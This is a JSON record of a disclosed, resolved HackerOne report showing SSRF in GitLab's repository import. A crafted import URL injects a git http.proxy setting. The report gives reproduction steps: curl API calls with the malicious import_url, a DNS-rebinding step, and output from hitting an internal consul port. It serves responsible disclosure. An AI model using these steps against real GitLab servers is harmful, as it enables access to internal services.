{
  "id": 855276,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTUyNzY=",
  "url": "https://hackerone.com/reports/855276",
  "title": "Injection of `http.<url>.*` git config settings leading to SSRF",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2020-04-21T14:56:04.931Z",
  "submitted_at": "2020-04-21T14:56:04.931Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vakzz",
    "url": "/vakzz",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQROZBLAGE%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T090758Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDcxIVdbf73l0UyPkhytCXQuCCZ556ldY9O9DVrDiiPYwIhAIQi89OzhXnxt4VmuD1AN%2FfISqOKKmGLYb43uu1bSJU4KrIFCBEQAxoMMDEzNjE5Mjc0ODQ5IgwKLrxR4GYcq%2Bxh%2FtYqjwXb0wGjLYDmzBSV87fTvkjusJovIAcpV9gf9KaGvzuZcMiisMIH3KYi%2BGmLj23misc5me3umAQh4Guku3amOrVZyxY0PggelkuoXxyYv5b012zS4bmenjfX8c%2Fu9o76jh4P5fOuqAzBzyiUbcrVedNsjD7KdZoS9ROGFmBY6tmf5CF8cTWD7SFJcNykQO37Cwe%2FrG4g%2BKPqfzNsd4xTKOCuxlB%2BRZ2dFnAG%2FMKtL86b9koEzi3EGOYvEb2MKTVs6HBLB33aPSvU9s8aLAYwv3asj7XhRInf10DA55VlGf00p%2FOKpS3nfn1WhgEWRNo9EVCJyMnubFqm1P%2FJwb6Rfc5lxXokWUrr0hVFInSS8Wm%2FxsJ%2FmFfVAURyyst1QSYoldugv2tOOggirqtv64lSWb6DbWfX93tIMrc3le7z1iWJaR0Gu09M5RZOrs1Eq2Snq%2BULBLJ6pzK9qwHMCGsVDvk35Y%2B9eACDwmLIoj3paRE4qpUED%2F2IO9AjcVHptQsJiaUlIYqRrBaYDOlLdkhoCOTjJiqXl5Q9ryXzEYlApYkiTAAeIqjOhdBNRs7P7HEhqxeTMr0kekdGKPvMntI7xK%2BXiSl6Q4%2BglVMUe9J%2FTcD1Kf4hKqqsVNCZUQa1fjxVV8FbVvBU2S9vHqf6B6%2BWzRzJc97%2BLmyecbEoVc80f8D5R3Kl7Px0gXSrpaHyz94GDfYlXH8c1uKzveeZA4ikSzpger9xrAglXII04feceK99wm5albNk9TBg0pykmzs1L%2BN2eWa7RbDGqv1H1Z6lvZdNCa8ajv%2FLP4zwx1m8OVHvhhT8g4LQUKLEG8D8C0wrWdy5EOlCOgHGtN7RP17tUSqdMZIg9IKKPwUTtCMXI2dCMJvRvsYGOrABZc6b2GZTpoTKOK4VNmEH87TVe%2BoM4DDT4YC641Rbhe0tziYV%2B%2BNnXEwwncFCUCNv2Og9fJf7cc1IA4jS3fmE982c2yoWKABwqrxW%2BZXwnYzr59fh72L%2FHFeGvXFSaRyS5QbBVvQ8Vr7%2BPl7yUNP4m%2BHDkBqhW5V8RAYqdRTZAOxAoolx3ZxS8gs18Pd1EqKKhqR78i%2BICPbWI01GNvDF17a0gKGlfaB6X5eDyMrezd8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=716acc44f21ff9077c5411279cbfecf743bdb3e40166300ea0918014d6c6fef3"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-09-08T13:46:02.172Z",
  "bug_reporter_agreed_on_going_public_at": "2020-09-08T13:46:02.134Z",
  "team_member_agreed_on_going_public_at": "2020-09-08T13:30:35.102Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\n\nWhen import a repo with credentials via a URL, gitaly generates the git clone command with a `-c` flag to add the Authorization header:\n\nhttps://gitlab.com/gitlab-org/gitaly/-/blob/master/internal/service/repository/create_from_url.go#L37\n```go\nflags = append(flags, git.ValueFlag{Name: \"-c\", Value: fmt.Sprintf(\"http.%s.extraHeader=%s\", u.String(), authHeader)})\n```\n\nWhich will create a command such as:\n```bash\ngit clone --bare -c http.followRedirects=false -c 'http.http://example.com/repo.git.extraHeader=Authorization: Basic YWE6YmI=' -- http://example.com/repo.git /repo/path\n```\n\nThe issue is that the url can contain one of the http config values from https://git-scm.com/docs/git-config#Documentation/git-config.txt-httplturlgt, which will result the user supplied config being set instead of `extraHeader` (with the `.extraHeader..` being appended to the value).\n\nThis allows an attacker to set things like `http.proxy` which can result in a SSRF if they use an import url such as `http://user@google.com/.proxy=http://proxy.aw.rs:8500`\n\n\n### Steps to reproduce\n1. Create a dns entry with a short TTL\n1. Start a server listening on the port that you want to hit with the SSRF that always returns `200 OK`, something like {F797777}\n1. Create a project with the specially crafted import url: `curl -H \"Authorization: Bearer $TOKEN\" -v -XPOST 'http://gitlab-vm.local/api/v4/projects?import_url=http://user@google.com/.proxy=http://proxy.aw.rs:8500&name=proxy4'`. This results in the following `.git/config` for the repo:\n\n    ```bash\n    sudo cat /var/opt/gitlab/git-data/repositories/@hashed/fc/56/fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a.git/config\n    [core]\n        repositoryformatversion = 0\n        filemode = true\n        bare = true\n    [http]\n        followredirects = false\n    [http \"http://google.com/\"]\n        proxy = http://proxy.aw.rs:8500.extraHeader=Authorization: Basic dXNlcg==\n    ```\n1. Update the dns entry to point to `127.0.0.1` and wait for it to propergate\n1. Add a new mirror to the project using the same host but with the path for the SSRF (it will go through the proxy), append a `?` to make sure the appended paths are removed: `curl -H \"Authorization: Bearer $TOKEN\" -v -XPUT 'http://gitlab-vm.local/api/v4/projects/204?mirror=true&import_url=http://google.com/v1/config?'`\n1. Check the status of the import to see the result of the SSRF (in this case hitting consul on port 8500)\n    ```bash\ncurl -H \"Authorization: Bearer $TOKEN\" -v 'http://gitlab-vm.local/api/v4/projects/204' | jq .import_error`\n\"2:Fetching remote upstream failed: remote: method GET not allowed\\nfatal: unable to access 'http://google.com/v1/config?/': The requested URL returned error: 405\\n\"\n    ```\n\nGit (via curl) allows for `socks4` and `socks5` proxies as well which could potentially be used to generated other SSRF payloads for things like redis or for leaking internal dns resolutions. There maybe other `http.*` configs that could be exploited, an interesting one is `http.cookieFile` but due to the appended `.extraHeader=` the path is not really controllable from my initial testing.\n\n### Impact\n* An attacker can set the `http.<url>.proxy` git config resulting in SSRF\n\n### What is the current *bug* behavior?\nThe git http config propertied can be influenced by the import url\n\n### What is the expected *correct* behavior?\nOnly the `extraHeader` config should be set via the git clone.\n\n### Output of checks\n#### Results of GitLab environment info\n```\nSystem information\nSystem:\t\tUbuntu 18.04\nProxy:\t\tno\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.6.5p114\nGem Version:\t2.7.10\nBundler Version:1.17.3\nRake Version:\t12.3.3\nRedis Version:\t5.0.7\nGit Version:\t2.24.2\nSidekiq Version:5.2.7\nGo Version:\tunknown\n\nGitLab information\nVersion:\t12.9.4-ee\nRevision:\t6a1a8e88568\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t10.12\nURL:\t\thttp://gitlab-vm.local\nHTTP Clone URL:\thttp://gitlab-vm.local/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab-vm.local:some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers:\n\nGitLab Shell\nVersion:\t12.0.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\n* An attacker can set the `http.<url>.proxy` git config resulting in SSRF",
  "bounty_amount": "3000.0",
  "formatted_bounty": "$3,000",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 797777,
      "file_name": "proxy.py",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bCVjsoFjdcjTMVBs7ktcT63c?response-content-disposition=attachment%3B%20filename%3D%22proxy.py%22%3B%20filename%2A%3DUTF-8%27%27proxy.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQROZBLAGE%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T090758Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDcxIVdbf73l0UyPkhytCXQuCCZ556ldY9O9DVrDiiPYwIhAIQi89OzhXnxt4VmuD1AN%2FfISqOKKmGLYb43uu1bSJU4KrIFCBEQAxoMMDEzNjE5Mjc0ODQ5IgwKLrxR4GYcq%2Bxh%2FtYqjwXb0wGjLYDmzBSV87fTvkjusJovIAcpV9gf9KaGvzuZcMiisMIH3KYi%2BGmLj23misc5me3umAQh4Guku3amOrVZyxY0PggelkuoXxyYv5b012zS4bmenjfX8c%2Fu9o76jh4P5fOuqAzBzyiUbcrVedNsjD7KdZoS9ROGFmBY6tmf5CF8cTWD7SFJcNykQO37Cwe%2FrG4g%2BKPqfzNsd4xTKOCuxlB%2BRZ2dFnAG%2FMKtL86b9koEzi3EGOYvEb2MKTVs6HBLB33aPSvU9s8aLAYwv3asj7XhRInf10DA55VlGf00p%2FOKpS3nfn1WhgEWRNo9EVCJyMnubFqm1P%2FJwb6Rfc5lxXokWUrr0hVFInSS8Wm%2FxsJ%2FmFfVAURyyst1QSYoldugv2tOOggirqtv64lSWb6DbWfX93tIMrc3le7z1iWJaR0Gu09M5RZOrs1Eq2Snq%2BULBLJ6pzK9qwHMCGsVDvk35Y%2B9eACDwmLIoj3paRE4qpUED%2F2IO9AjcVHptQsJiaUlIYqRrBaYDOlLdkhoCOTjJiqXl5Q9ryXzEYlApYkiTAAeIqjOhdBNRs7P7HEhqxeTMr0kekdGKPvMntI7xK%2BXiSl6Q4%2BglVMUe9J%2FTcD1Kf4hKqqsVNCZUQa1fjxVV8FbVvBU2S9vHqf6B6%2BWzRzJc97%2BLmyecbEoVc80f8D5R3Kl7Px0gXSrpaHyz94GDfYlXH8c1uKzveeZA4ikSzpger9xrAglXII04feceK99wm5albNk9TBg0pykmzs1L%2BN2eWa7RbDGqv1H1Z6lvZdNCa8ajv%2FLP4zwx1m8OVHvhhT8g4LQUKLEG8D8C0wrWdy5EOlCOgHGtN7RP17tUSqdMZIg9IKKPwUTtCMXI2dCMJvRvsYGOrABZc6b2GZTpoTKOK4VNmEH87TVe%2BoM4DDT4YC641Rbhe0tziYV%2B%2BNnXEwwncFCUCNv2Og9fJf7cc1IA4jS3fmE982c2yoWKABwqrxW%2BZXwnYzr59fh72L%2FHFeGvXFSaRyS5QbBVvQ8Vr7%2BPl7yUNP4m%2BHDkBqhW5V8RAYqdRTZAOxAoolx3ZxS8gs18Pd1EqKKhqR78i%2BICPbWI01GNvDF17a0gKGlfaB6X5eDyMrezd8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=721e00dabc818880294e10d54eab949408e2ed315c968781386c631789cb5a30",
      "file_size": 343,
      "type": "text/x-python",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 36,
  "voters": [
    "overjt",
    "n1m0",
    "p1stachios",
    "mattberg",
    "ali",
    "bl4de",
    "pirateducky",
    "leonishan",
    "naategh",
    "official_blackhat13",
    "and 26 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 39022,
    "asset_type": "OTHER",
    "asset_identifier": "Your Own GitLab Instance",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
